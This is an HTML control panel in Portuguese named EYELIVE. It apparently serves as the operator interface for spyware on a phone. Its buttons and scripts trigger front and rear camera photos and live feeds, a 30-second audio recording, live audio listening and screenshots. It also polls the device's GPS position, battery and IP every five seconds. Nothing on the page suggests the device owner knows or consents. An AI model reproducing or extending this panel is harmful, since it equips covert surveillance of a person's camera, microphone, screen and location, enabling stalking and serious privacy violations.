<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
    <title>EYELIVE</title>
    <style>
        :root{--bg:#0d0d0d;--card:#1a1a1a;--gold:#ffd700;--green:#4caf50;--red:#f44336;--text:#fff;--sub:#aaa}
        *{margin:0;padding:0;box-sizing:border-box}
        body{background:var(--bg);color:var(--text);font-family:'Segoe UI',system-ui,sans-serif;font-size:14px}
        .header{background:#000;padding:15px;display:flex;align-items:center;justify-content:space-between;border-bottom:1px solid #222}
        .header h1{font-size:1.3em;font-weight:700}.header h1 span{color:var(--gold)}
        .status-dot{width:8px;height:8px;background:var(--green);border-radius:50%;display:inline-block;margin-right:6px}
        .nav{display:flex;background:#111;border-bottom:1px solid #222;overflow-x:auto}
        .nav a{padding:14px 18px;color:var(--sub);text-decoration:none;font-size:.85em;white-space:nowrap;border-bottom:3px solid transparent}
        .nav a.active,.nav a:hover{color:var(--gold);border-bottom-color:var(--gold)}
        .container{padding:15px;max-width:900px;margin:0 auto}
        .section-title{font-size:1.1em;font-weight:600;margin:20px 0 12px;padding-bottom:8px;border-bottom:1px solid #222;color:var(--gold)}
        .cam-card{background:var(--card);border:1px solid #2a2a2a;border-radius:12px;overflow:hidden;margin-bottom:15px}
        .cam-body{width:100%;height:250px;background:#000;display:flex;align-items:center;justify-content:center;color:#333;font-size:4em;overflow:hidden;position:relative}
        .cam-body img{width:100%;height:100%;object-fit:cover}
        .cam-actions{padding:10px;display:flex;gap:8px;flex-wrap:wrap}
        .live-badge{position:absolute;top:10px;right:10px;background:var(--red);color:#fff;padding:5px 10px;border-radius:10px;font-size:.7em;animation:pulse 1s infinite}
        @keyframes pulse{0%,100%{opacity:1}50%{opacity:.5}}
        .btn{padding:10px 18px;border:none;border-radius:6px;font-weight:600;cursor:pointer;font-size:.8em;text-transform:uppercase}
        .btn-gold{background:var(--gold);color:#000}.btn-green{background:var(--green);color:#fff}.btn-red{background:var(--red);color:#fff}
        .tab-content{display:none}.tab-content.active{display:block}
        .info-row{display:flex;justify-content:space-between;padding:8px 0;border-bottom:1px solid #1a1a1a;font-size:.85em}
        .info-row span:first-child{color:var(--sub)}.info-row span:last-child{color:#fff;font-weight:600}
        .map-placeholder{width:100%;height:250px;background:#111;border-radius:8px;display:flex;align-items:center;justify-content:center;color:#444;font-size:2em}
    </style>
</head>
<body>
<div class="header"><h1><span>EYE</span>LIVE</h1><span style="color:var(--green);font-size:.8em"><span class="status-dot"></span> {{DEVICE}}</span></div>
<div class="nav">
    <a href="#" class="active" onclick="tab('inicio',this)">🏠 Início</a>
    <a href="#" onclick="tab('mapas',this)">🗺️ Mapas</a>
    <a href="#" onclick="tab('info',this)">📊 Info</a>
</div>
<div class="container">
    <div id="tab-inicio" class="tab-content active">
        
        <div class="section-title">📷 Câmera Frontal</div>
        <div class="cam-card">
            <div class="cam-body" id="frontal-view"><span>📷</span></div>
            <div class="cam-actions">
                <button class="btn btn-gold" onclick="foto('frontal')">📸 Foto</button>
                <button class="btn btn-green" onclick="live('frontal')">▶️ Live</button>
                <button class="btn btn-red" onclick="pararLive('frontal')">⏹️ Parar</button>
            </div>
        </div>
        
        <div class="section-title">📷 Câmera Traseira</div>
        <div class="cam-card">
            <div class="cam-body" id="traseira-view"><span>📷</span></div>
            <div class="cam-actions">
                <button class="btn btn-gold" onclick="foto('traseira')">📸 Foto</button>
                <button class="btn btn-green" onclick="live('traseira')">▶️ Live</button>
                <button class="btn btn-red" onclick="pararLive('traseira')">⏹️ Parar</button>
            </div>
        </div>
        
        <div class="section-title">🎤 Áudio</div>
        <div class="cam-card">
            <div class="cam-actions">
                <button class="btn btn-red" onclick="audio()">🔴 Gravar 30s</button>
                <button class="btn btn-green" onclick="audioLive()">🎧 Escuta ao Vivo</button>
            </div>
            <audio id="audioPlayer" controls style="width:100%;margin-top:10px;display:none"></audio>
        </div>
        
        <div class="section-title">📱 Tela</div>
        <div class="cam-card">
            <div class="cam-body" style="height:280px" id="tela-view"><span>📱</span></div>
            <div class="cam-actions"><button class="btn btn-gold" onclick="cmd('screenshot')">📸 Screenshot</button></div>
        </div>
    </div>
    
    <div id="tab-mapas" class="tab-content">
        <div class="section-title">📍 GPS</div>
        <div class="map-placeholder">🗺️</div>
        <div style="margin-top:10px">
            <div class="info-row"><span>Latitude</span><span id="gps-lat">--</span></div>
            <div class="info-row"><span>Longitude</span><span id="gps-lng">--</span></div>
        </div>
    </div>
    
    <div id="tab-info" class="tab-content">
        <div class="section-title">📊 Dispositivo</div>
        <div class="info-row"><span>Nome</span><span id="info-nome">--</span></div>
        <div class="info-row"><span>Bateria</span><span id="info-bat">--</span></div>
        <div class="info-row"><span>IP</span><span id="info-ip">--</span></div>
    </div>
</div>

<script>
var liveTimers={};
function tab(t,el){document.querySelectorAll('.tab-content').forEach(x=>x.classList.remove('active'));document.querySelectorAll('.nav a').forEach(a=>a.classList.remove('active'));document.getElementById('tab-'+t).classList.add('active');el.classList.add('active')}
function foto(cam){fetch('/cmd/foto_'+cam).then(r=>r.json()).then(d=>alert(d.msg))}
function live(cam){
    fetch('/cmd/live_'+cam);
    document.getElementById(cam+'-view').innerHTML='<img src="/live/'+cam+'?t='+Date.now()+'" id="live-img-'+cam+'"><div class="live-badge">LIVE</div>';
    liveTimers[cam]=setInterval(function(){
        var img=document.getElementById('live-img-'+cam);
        if(img)img.src='/live/'+cam+'?t='+Date.now();
    },2000);
}
function pararLive(cam){
    fetch('/cmd/parar_'+cam);
    clearInterval(liveTimers[cam]);
    document.getElementById(cam+'-view').innerHTML='<span>📷</span>';
}
function audio(){fetch('/cmd/audio').then(r=>r.json()).then(d=>alert(d.msg))}
function audioLive(){
    fetch('/cmd/audio_live').then(r=>r.json()).then(d=>{
        alert(d.msg);
        var player=document.getElementById('audioPlayer');
        player.style.display='block';
        player.src='/audio_live?t='+Date.now();
        player.play();
    });
}
function cmd(c){fetch('/cmd/'+c).then(r=>r.json()).then(d=>alert(d.msg||'OK'))}
function update(){fetch('/api/status').then(r=>r.json()).then(d=>{
    document.getElementById('gps-lat').textContent=d.gps.lat;
    document.getElementById('gps-lng').textContent=d.gps.lng;
    document.getElementById('info-bat').textContent=d.bateria+(d.carregando?' [CARREGANDO]':'');
    document.getElementById('info-ip').textContent=d.ip;
    document.getElementById('info-nome').textContent=d.nome
})}
setInterval(update,5000);update()
</script>
</body>
</html>
